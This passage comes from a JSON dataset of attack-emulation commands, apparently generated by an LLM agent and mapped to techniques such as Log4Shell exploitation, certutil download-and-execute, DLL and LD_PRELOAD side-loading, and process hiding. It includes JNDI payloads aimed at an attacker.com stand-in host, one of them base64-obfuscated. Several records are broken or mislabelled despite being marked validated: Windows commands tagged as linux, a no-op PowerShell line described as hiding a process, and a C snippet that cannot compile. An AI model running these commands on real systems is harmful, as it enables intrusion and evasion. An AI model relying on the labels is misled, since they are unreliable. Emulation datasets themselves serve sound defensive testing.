      "id": "34849de9-2226-433f-9154-88ddd44ee174",
      "ttp_id": "632e57be-75cc-4478-8d50-2ce60af956b8",
      "technique_id": "632e57be-75cc-4478-8d50-2ce60af956b8",
      "technique_name": "Gather Victim Host Information",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "uname -a && cat /etc/os-release && ps aux --no-headers && ss -tuln",
      "description": "Gather comprehensive system information including kernel version, OS distribution, running processes, and active network listeners.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs system architecture, OS details, full list of running processes, and all listening TCP/UDP ports without blocking or modifying the system.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:51:10.794587",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "5e943a2c-b702-4b22-8293-b576aab3dcea",
      "ttp_id": "d58c898c-b174-4f1e-9d26-0e5715c2a046",
      "technique_id": "d58c898c-b174-4f1e-9d26-0e5715c2a046",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "cmd.exe /c \"whoami && ipconfig /all && netstat -ano\"",
      "description": "Basic reconnaissance: gather system, network, and connection information using legacy binaries.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs current user context, network configuration, and active connections. No changes to system state. Runs successfully for any user.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:39:28.314636",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.706,
      "validated": true
    },
    {
      "id": "74e6b7b4-74e9-47e0-ad74-b98c010207f3",
      "ttp_id": "d58c898c-b174-4f1e-9d26-0e5715c2a046",
      "technique_id": "d58c898c-b174-4f1e-9d26-0e5715c2a046",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "powershell -Command \"try { $payload = 'cmd.exe /c echo PERSISTENCE > %TEMP%\\\\beacon.txt'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload)); Start-Process powershell.exe -ArgumentList '-EncodedCommand', $encoded } catch { exit }\"",
      "description": "Advanced: execute an encoded command to simulate stealthy payload execution after exploitation.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Encodes a benign persistence command in Base64 (UTF-16LE), then executes it via PowerShell. This mimics obfuscated execution seen in real attacks. No actual persistence is created unless the encoded command is altered. Safe in isolated environments.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:39:28.316675",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.706,
      "validated": true
    },
    {
      "id": "88b36e1b-e532-471b-ba38-e8e4afce3ece",
      "ttp_id": "d58c898c-b174-4f1e-9d26-0e5715c2a046",
      "technique_id": "d58c898c-b174-4f1e-9d26-0e5715c2a046",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "curl -H 'User-Agent: ${jndi:ldap://127.0.0.1:1389/a}' http://localhost:8080/",
      "description": "Basic exploitation attempt using Log4Shell payload in User-Agent header",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends HTTP request with JNDI lookup string in User-Agent header to trigger Log4Shell vulnerability; no actual exploitation occurs if target is patched",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:10.528662",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.706,
      "validated": true
    },
    {
      "id": "fbef59b8-7e8c-4e4f-b858-0410fd14c1f4",
      "ttp_id": "d58c898c-b174-4f1e-9d26-0e5715c2a046",
      "technique_id": "d58c898c-b174-4f1e-9d26-0e5715c2a046",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "echo '${jndi:dns://attacker.com/payload}' > /tmp/log4shell_test && curl -d @/tmp/log4shell_test http://localhost:8080/login && rm -f /tmp/log4shell_test",
      "description": "Intermediate test: writes exploit string to temporary file and sends via POST data",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a temporary file containing a DNS-based JNDI payload, sends it in a POST request body, then deletes the file; simulates staged exploitation attempt",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:10.528662",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.706,
      "validated": true
    },
    {
      "id": "4179139b-04f4-40d9-b7a4-3076a6b56d9c",
      "ttp_id": "d58c898c-b174-4f1e-9d26-0e5715c2a046",
      "technique_id": "d58c898c-b174-4f1e-9d26-0e5715c2a046",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "payload=$(echo 'T2xkUGFzc3dvcmQ6JHtqbmRpOmRuczovL2xvZzRzaGVsbC5hdHRhY2tlci5jb20ve1VTRVJ9fQ==' | base64 -d); curl -H \"Authorization: $payload\" http://localhost:8080/secure",
      "description": "Advanced test: decodes and injects obfuscated JNDI payload into Authorization header",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes a base64-encoded string containing a JNDI lookup and injects it into an HTTP header; simulates obfuscated exploitation attempt",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:10.528662",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.706,
      "validated": true
    },
    {
      "id": "d486ef73-c24c-45c5-8bc9-29e15b62720e",
      "ttp_id": "1bb2a359-f806-42ce-9af9-fd287ead4e83",
      "technique_id": "1bb2a359-f806-42ce-9af9-fd287ead4e83",
      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "cmd.exe /c echo Test payload execution > \"%TEMP%\\debug_log.txt\"",
      "description": "Basic command to simulate writing a test payload output to a temporary file using cmd.exe",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a file named debug_log.txt in the user's TEMP directory with the content 'Test payload execution'. No elevated privileges required. Uses built-in cmd.exe and redirects output safely.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:10.529168",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.706,
      "validated": true
    },
    {
      "id": "3e4239b2-8391-4cea-a08d-aba7887c71c8",
      "ttp_id": "1bb2a359-f806-42ce-9af9-fd287ead4e83",
      "technique_id": "1bb2a359-f806-42ce-9af9-fd287ead4e83",
      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "cmd.exe /c certutil.exe -urlcache -split -f http://127.0.0.1/file.txt \"%TEMP%\\file.txt\" & copy \"%TEMP%\\file.txt\" \"%TEMP%\\file.b64\" & certutil.exe -decode \"%TEMP%\\file.b64\" \"%TEMP%\\file.exe\" & start \"\" \"%TEMP%\\file.exe\"",
      "description": "Intermediate command chain simulating download and execution of a file using certutil.exe and cmd.exe",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from localhost (benign in test), decodes a Base64 file, and executes it. In a real attack, this could deliver a payload. Here, it uses localhost and local files to avoid real network activity. Execution may fail safely if files don't exist.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:10.529168",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.706,
      "validated": true
    },
    {
      "id": "008a3dc3-80a0-428a-99e8-623def87a28c",
      "ttp_id": "1bb2a359-f806-42ce-9af9-fd287ead4e83",
      "technique_id": "1bb2a359-f806-42ce-9af9-fd287ead4e83",
      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '%TEMP%\\\\_tmp' -ErrorAction SilentlyContinue; $cmd = 'cmd.exe /c echo Running encoded task > \"%TEMP%\\\\_tmp\\\\task.log\"'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd); $encoded = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encoded\"",
      "description": "Advanced command demonstrating PowerShell-encoded execution of a Windows Command Shell command",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a temporary subdirectory, encodes a benign cmd command in Base64 using UTF-16LE, and executes it via powershell -EncodedCommand. This simulates obfuscation techniques. Uses only built-in tools and safe paths. No actual malicious payload is used.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:10.529168",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.706,
      "validated": true
    },
    {
      "id": "eaf6df23-e893-4691-b2ba-7ed5f9f32a52",
      "ttp_id": "1bb2a359-f806-42ce-9af9-fd287ead4e83",
      "technique_id": "1bb2a359-f806-42ce-9af9-fd287ead4e83",
      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "cmd.exe /c echo Test backdoor payload > \"%TEMP%\\msvhost.log\" & certutil.exe -urlcache -split -f \"http://example.com/404\" \"%TEMP%\\msvhost2.log\" 2>&1 > nul & start \"\" \"%TEMP%\\msvhost.log\"",
      "description": "Simulates downloading a payload using certutil and executing a log file as a script (harmless echo). Uses common evasion technique with invalid URL to trigger error logging.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a test file in TEMP with echo, attempts (and fails) to download from a non-existent URL using certutil, then opens the log file in the default viewer. No actual payload is transferred.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:53:01.212347",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.706,
      "validated": true
    },
    {
      "id": "7282ede6-ba51-48ed-9647-1ebc852d9d0f",
      "ttp_id": "1bb2a359-f806-42ce-9af9-fd287ead4e83",
      "technique_id": "1bb2a359-f806-42ce-9af9-fd287ead4e83",
      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "cmd.exe /c mkdir \"%TEMP%\\_svc\" -ErrorAction SilentlyContinue 2>nul & echo ^<% ^@echo off^> \"%TEMP%\\_svc\\startup.bat\" & certutil.exe -decode \"%TEMP%\\_svc\\b64.txt\" \"%TEMP%\\_svc\\payload.bat\" & start \"\" \"%TEMP%\\_svc\\payload.bat\"",
      "description": "Simulates decoding and executing a Base64-encoded script. Uses certutil for decoding, mimicking common post-exploitation behavior.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a subdirectory in TEMP, writes a dummy batch file, attempts to decode a non-existent Base64 file (harmless if missing), then tries to run it. No internet access or malicious content involved.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:53:01.212347",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.706,
      "validated": true
    },
    {
      "id": "d47c7cad-c5bd-49ed-92b2-e164fdab05d5",
      "ttp_id": "1bb2a359-f806-42ce-9af9-fd287ead4e83",
      "technique_id": "1bb2a359-f806-42ce-9af9-fd287ead4e83",
      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "powershell -Command \"try { $content = 'REM Milestone Backdoor Stub'; $path = \"$env:TEMP\\svchosts.dat\"; Set-Content -Path $path -Value $content -Force; Start-Process cmd.exe -ArgumentList '/c', 'start', $path'; } catch { exit 1 }\"",
      "description": "Uses PowerShell to write a fake backdoor stub to disk and execute it via cmd, simulating script deployment and execution.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Writes a harmless comment line to a file named svchosts.dat in TEMP and opens it in the default application. No actual malicious execution occurs.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:53:01.212347",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.706,
      "validated": true
    },
    {
      "id": "d53f6535-15fe-4a30-b251-267556a0f0e7",
      "ttp_id": "ad2084b5-d61d-4cbd-85d8-9f884db95fec",
      "technique_id": "ad2084b5-d61d-4cbd-85d8-9f884db95fec",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "ipconfig /all",
      "description": "Gather detailed network configuration including IP addresses, DNS servers, and interface details.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs network adapter configuration to stdout, including MAC addresses, IPv4/v6 addresses, subnet masks, and default gateways.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.175929",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "4714fbff-35c0-4db7-aa48-aebf09429ab3",
      "ttp_id": "ad2084b5-d61d-4cbd-85d8-9f884db95fec",
      "technique_id": "ad2084b5-d61d-4cbd-85d8-9f884db95fec",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "tasklist",
      "description": "List all currently running processes with image name, PID, and memory usage.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays a list of active processes, including system and user-level applications, similar to 'ps' on Unix-like systems.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.175929",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "07e9dedb-c8bd-463b-bc67-4ca20be53efc",
      "ttp_id": "ad2084b5-d61d-4cbd-85d8-9f884db95fec",
      "technique_id": "ad2084b5-d61d-4cbd-85d8-9f884db95fec",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"try { $data = systeminfo; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($data)); Write-Output $encoded } catch { exit 1 }\"",
      "description": "Execute systeminfo and encode the output in Base64 for exfiltration simulation.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Runs systeminfo, captures output, converts it to Base64 using Unicode (UTF-16LE) encoding, and prints it to stdout without writing to disk.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.177097",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "d7ce9998-2f2a-4c07-8448-5f7891d09cc4",
      "ttp_id": "ad2084b5-d61d-4cbd-85d8-9f884db95fec",
      "technique_id": "ad2084b5-d61d-4cbd-85d8-9f884db95fec",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "ps aux",
      "description": "List all running processes with detailed information",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a list of all running processes, including user, PID, CPU/memory usage, and command line. This is commonly used by attackers to identify running services and potential privilege escalation targets.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:45:46.088772",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "692c8cef-b01e-4b64-b98a-6e3a5ceba5da",
      "ttp_id": "ad2084b5-d61d-4cbd-85d8-9f884db95fec",
      "technique_id": "ad2084b5-d61d-4cbd-85d8-9f884db95fec",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "netstat -tuln",
      "description": "Display active listening ports and network connections",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Shows TCP and UDP ports that are currently listening, along with their IP and port bindings. Helps attackers discover network services exposed on the system.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:45:46.088772",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "6ffbf229-02e0-4a38-8e23-df23f20a6b05",
      "ttp_id": "ad2084b5-d61d-4cbd-85d8-9f884db95fec",
      "technique_id": "ad2084b5-d61d-4cbd-85d8-9f884db95fec",
      "technique_name": "System Information Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "lsof -i :22; lsmod; uname -a",
      "description": "Check if SSH is active, list loaded kernel modules, and get system kernel information",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Runs multiple discovery commands in sequence: checks for SSH connections via lsof, lists kernel modules (useful for privilege escalation research), and retrieves detailed OS/kernel version info. This simulates advanced reconnaissance after initial access.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:45:46.088772",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "4ffb176d-0839-4070-894e-68105b36d33f",
      "ttp_id": "93cbd072-0d1f-4821-b4a1-b84bb57ae5fb",
      "technique_id": "93cbd072-0d1f-4821-b4a1-b84bb57ae5fb",
      "technique_name": "Hijack Execution Flow: DLL Side-Loading",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "copy \"%SystemRoot%\\System32\\notepad.exe\" \"%TEMP%\\legit_app.exe\" & echo This is a benign DLL placeholder > \"%TEMP%\\msvcrt.dll\"",
      "description": "Basic DLL side-loading simulation: copies notepad as a legitimate app and places a spoofed DLL (msvcrt.dll) in the same directory to be loaded on execution.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a copy of notepad.exe in %TEMP% named legit_app.exe and creates a text file named msvcrt.dll in the same directory. When legit_app.exe is executed, it would normally load msvcrt.dll from the current directory if not found elsewhere (simulated hijack). No actual code execution occurs due to benign DLL content.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.858738",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "c597f33d-35b2-45d9-9a43-020b385008d8",
      "ttp_id": "93cbd072-0d1f-4821-b4a1-b84bb57ae5fb",
      "technique_id": "93cbd072-0d1f-4821-b4a1-b84bb57ae5fb",
      "technique_name": "Hijack Execution Flow: DLL Side-Loading",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "mkdir \"%TEMP%\\app_dir\" -ErrorAction SilentlyContinue & copy \"%SystemRoot%\\System32\\calc.exe\" \"%TEMP%\\app_dir\\update_manager.exe\" & echo Simulated side-loaded DLL content > \"%TEMP%\\app_dir\\crypt32.dll\"",
      "description": "Intermediate simulation: creates a directory for a fake application, copies calc.exe as update_manager.exe, and places a spoofed crypt32.dll to be loaded when the app runs.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a directory %TEMP%\\app_dir, copies calc.exe as update_manager.exe, and creates a text file named crypt32.dll. When update_manager.exe is run, Windows may attempt to load crypt32.dll from the local directory, simulating a hijacked execution flow. The DLL is benign and does not execute code.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.858738",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "c9dc2643-b08a-484e-8d12-9000c0b3eda4",
      "ttp_id": "93cbd072-0d1f-4821-b4a1-b84bb57ae5fb",
      "technique_id": "93cbd072-0d1f-4821-b4a1-b84bb57ae5fb",
      "technique_name": "Hijack Execution Flow: DLL Side-Loading",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '%TEMP%\\payload' -ErrorAction SilentlyContinue; $dllContent = [Text.Encoding]::UTF8.GetBytes('Simulated malicious DLL'); [IO.File]::WriteAllBytes('%TEMP%\\payload\\winhttp.dll', $dllContent); Copy-Item '%SystemRoot%\\System32\\ipconfig.exe' '%TEMP%\\payload\\diag_util.exe' -Force; \"",
      "description": "Advanced simulation: uses PowerShell to create a payload directory, write a spoofed winhttp.dll, and copy ipconfig.exe as diag_util.exe to trigger DLL load from local directory.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates %TEMP%\\payload, writes a binary-like but benign winhttp.dll, and copies ipconfig.exe as diag_util.exe. When diag_util.exe is executed, it may attempt to load winhttp.dll from the current directory, simulating a hijacked execution. The DLL does not contain executable code and is safe. Uses only built-in tools and avoids unsafe operations.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.859336",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "7158c5e7-5f60-47e8-bb3e-3be87cd28ddb",
      "ttp_id": "93cbd072-0d1f-4821-b4a1-b84bb57ae5fb",
      "technique_id": "93cbd072-0d1f-4821-b4a1-b84bb57ae5fb",
      "technique_name": "Hijack Execution Flow: DLL Side-Loading",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "cp /lib/x86_64-linux-gnu/libc.so.6 $HOME/fake_libc.so.6 && chmod +x $HOME/fake_libc.so.6",
      "description": "Copy a benign system library to a fake name in user directory to simulate a side-loaded library.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A copy of libc.so.6 is placed in the user's home directory with a name that could be used to trick a vulnerable application into loading it instead of the real one.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:45:46.083016",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "2f43502c-9f37-4922-afa8-4a722ef78aa2",
      "ttp_id": "93cbd072-0d1f-4821-b4a1-b84bb57ae5fb",
      "technique_id": "93cbd072-0d1f-4821-b4a1-b84bb57ae5fb",
      "technique_name": "Hijack Execution Flow: DLL Side-Loading",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "mkdir -p $HOME/app && cp /usr/bin/ls $HOME/app/legit_app && cp $HOME/fake_libc.so.6 $HOME/app/libc.so.6 && cd $HOME/app && ./legit_app",
      "description": "Place a copied legitimate binary and a fake library in the same directory; when executed, the binary may load the local library due to relative search path.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The 'ls' binary is copied to a local directory along with a fake libc.so.6. When run, it may attempt to load the local library first, simulating DLL side-loading behavior.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:45:46.083016",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "448d578b-08da-421f-8353-308143c55154",
      "ttp_id": "93cbd072-0d1f-4821-b4a1-b84bb57ae5fb",
      "technique_id": "93cbd072-0d1f-4821-b4a1-b84bb57ae5fb",
      "technique_name": "Hijack Execution Flow: DLL Side-Loading",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "LD_PRELOAD=$HOME/fake_libc.so.6 /usr/bin/ls",
      "description": "Use LD_PRELOAD to force the 'ls' command to load a custom shared library before execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The system runs 'ls' with the specified shared library preloaded, demonstrating how execution flow can be hijacked via environment variables on Linux.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:45:46.083016",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "987f1757-8a7d-44dd-b0f6-0847e7caf32f",
      "ttp_id": "a24669e5-766d-4682-b6de-55324292c57a",
      "technique_id": "a24669e5-766d-4682-b6de-55324292c57a",
      "technique_name": "Hide System Processes",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "sc.exe create HideProcess binPath= \"C:\\Windows\\System32\\cmd.exe /c echo Hidden\"",
      "description": "Create a new service that runs a hidden command",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new service will be created and the command will be executed in the background",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:19.087062",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "4b16fa79-db8d-414d-a4cd-5a995764ae23",
      "ttp_id": "a24669e5-766d-4682-b6de-55324292c57a",
      "technique_id": "a24669e5-766d-4682-b6de-55324292c57a",
      "technique_name": "Hide System Processes",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell.exe -Command \"Get-Process | Where-Object {$_.ProcessName -eq 'cmd'} | ForEach-Object {$_.Handle} | Out-Null\"",
      "description": "Use PowerShell to get the handle of the 'cmd' process and hide it",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The 'cmd' process will be hidden from the process list",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:19.087062",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "c69dc466-2e3f-4d48-bc43-54d1452a5818",
      "ttp_id": "a24669e5-766d-4682-b6de-55324292c57a",
      "technique_id": "a24669e5-766d-4682-b6de-55324292c57a",
      "technique_name": "Hide System Processes",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "cmd.exe /c \"echo HideProcess > %TEMP%\\HideProcess.txt && attrib +H +S %TEMP%\\HideProcess.txt\"",
      "description": "Create a hidden file in the temp directory to simulate a hidden process",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A hidden file will be created in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:19.087062",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "cf9fffc4-4f5f-4185-9c2f-db0579f1d2f9",
      "ttp_id": "a24669e5-766d-4682-b6de-55324292c57a",
      "technique_id": "a24669e5-766d-4682-b6de-55324292c57a",
      "technique_name": "Hide System Processes",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "sudo insmod /tmp/hide_process.ko",
      "description": "Loads a kernel module designed to hide a specific process by manipulating the process list in kernel memory",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "After loading, the kernel module hooks into the process list and removes a targeted process (e.g., by PID) from /proc enumeration, making it invisible to ps, top, and similar tools",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:28.606457",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "69b80659-a3e2-44c0-a79a-b99359cc716c",
      "ttp_id": "a24669e5-766d-4682-b6de-55324292c57a",
      "technique_id": "a24669e5-766d-4682-b6de-55324292c57a",
      "technique_name": "Hide System Processes",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "sudo bpftool prog load /tmp/tracepoint_hide.bpf.o /sys/fs/bpf/hide_proc --pin /sys/fs/bpf/hide_proc",
      "description": "Uses bpftool to load an eBPF program that hooks into process execution and hides specific processes by modifying visibility in kernel structures",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The eBPF program attaches to tracepoints and alters process visibility in real-time, causing specific processes to not appear in system process listings",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:28.606963",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "55e9b3ce-5ff0-4f69-9b8c-22e2505fc2c9",
      "ttp_id": "a24669e5-766d-4682-b6de-55324292c57a",
      "technique_id": "a24669e5-766d-4682-b6de-55324292c57a",
      "technique_name": "Hide System Processes",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "gcc -Wall -Wextra -O2 -shared -fPIC -o /tmp/fake_proc.so -x c - <<< '#include <stdio.h> int getdents64(unsigned int fd, void *dirp, unsigned int count) { return 0; }' && LD_PRELOAD=/tmp/fake_proc.so ps aux",
      "description": "Uses LD_PRELOAD to inject a shared library that overrides getdents64 to filter out process entries from /proc, simulating process hiding at the user level",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The ps command will show no running processes because the injected library intercepts and nullifies directory reads of /proc, simulating process hiding without kernel modification",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:28.606963",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "e8dff871-8872-4f11-8e24-7237f02e3ef8",
      "ttp_id": "af1e7ebb-f91a-40ee-862c-bea50e7d00ee",
      "technique_id": "af1e7ebb-f91a-40ee-862c-bea50e7d00ee",
      "technique_name": "Masquerading",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "certutil -f -urlcache http://example.com/benign.txt %TEMP%\\benign.txt",
      "description": "Utilize certutil to download a file, masquerading as a legitimate certificate operation.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Downloads a file to the temporary directory, potentially evading detection by masquerading as a certificate utility operation.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:19.089167",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "5cd2faf8-b154-4027-a4e6-57a4b8da478a",
      "ttp_id": "af1e7ebb-f91a-40ee-862c-bea50e7d00ee",
      "technique_id": "af1e7ebb-f91a-40ee-862c-bea50e7d00ee",
      "technique_name": "Masquerading",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"mkdir $env:TEMP\\_Startup -ErrorAction SilentlyContinue; whoami.exe /priv\"",
      "description": "Create a new directory and execute whoami.exe to blend in with normal system activity.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a new directory in the temporary folder and then executes whoami.exe, potentially masquerading as a normal system operation.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:19.089167",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.702,
      "validated": true
    },
    {
      "id": "95b86f6a-1369-4a42-bbdd-d0e7ccf725f1",
      "ttp_id": "af1e7ebb-f91a-40ee-862c-bea50e7d00ee",
      "technique_id": "af1e7ebb-f91a-40ee-862c-bea50e7d00ee",
      "technique_name": "Masquerading",
      "tactic": "Defense Evasion",
      "platform": "windows",
